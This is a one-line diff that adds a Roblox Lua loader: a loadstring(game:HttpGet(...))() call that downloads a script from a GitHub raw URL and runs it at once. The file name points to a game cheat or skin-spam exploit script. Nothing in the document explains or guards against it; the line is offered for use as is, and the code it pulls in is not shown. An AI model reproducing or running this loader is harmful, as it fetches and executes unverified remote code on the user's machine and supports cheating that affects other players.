@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/clean-crew-class-skins-spam7-ikhkhekfjom2lf.lua"))()
